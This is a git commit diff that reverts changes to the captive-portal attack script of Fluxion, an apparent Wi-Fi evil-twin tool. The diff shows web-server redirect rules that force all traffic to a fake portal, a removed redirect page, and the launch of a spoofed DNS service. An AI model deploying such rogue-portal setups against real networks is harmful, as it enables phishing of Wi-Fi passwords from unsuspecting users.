345d409daaf1cf996dc3bb4985110366decfd76a
unknown <usama123456789@protonmail.com>
2019-09-02 07:33:11 +0500

    Revert "Add files via upload"
    This reverts commit e90db2b97d81484cffdd2f0e0c4d5af5c50b091b.

--- attacks/Captive Portal/attack.sh
+++ attacks/Captive Portal/attack.sh
@@ -699,7 +699,9 @@ static-file.exclude-extensions = (
 )
 
 index-file.names = (
-    \"redirect.html\"
+    \"index.htm\",
+    \"index.html\",
+    \"index.php\"
 )
 " >"$FLUXIONWorkspacePath/lighttpd.conf"
 
@@ -731,10 +733,10 @@ index-file.names = (
   else
     echo "\
 # Redirect all traffic to the captive portal when not emulating a connection.
-\$HTTP[\"host\"] != \"redirect.html\" {
-    url.redirect-code = 200
+\$HTTP[\"host\"] != \"captive.gateway.lan\" {
+    url.redirect-code = 307
     url.redirect  = (
-        \"^/(.*)\" => \"http://redirect.html/\",
+        \"^/(.*)\" => \"http://captive.gateway.lan/\",
     )
 }
 " >>"$FLUXIONWorkspacePath/lighttpd.conf"
@@ -1098,17 +1100,6 @@ captive_portal_generic() {
         </div>
     </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/error.html"
-
-echo "\
-<html>
-   <head>
-      <title>Redirecting to Captive Portal</title>
-      <meta http-equiv=\"refresh\" content=\"0; url=index.html\">
-   </head>
-   <body>
-      <p>Please wait, refreshing.  If page does not refresh, click <a href=\"index.html\">here</a> to login.</p>
-   </body>
-</html>" >"$FLUXIONWorkspacePath/captive_portal/redirect.html"
 
   echo "\
 <!DOCTYPE html>
@@ -1508,7 +1499,7 @@ start_attack() {
     "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; fi" &
   # Save parent's pid, to get to child later.
   CaptivePortalDNSServiceXtermPID=$!
-  
+
   echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
   lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" \
     &> $FLUXIONOutputDevice
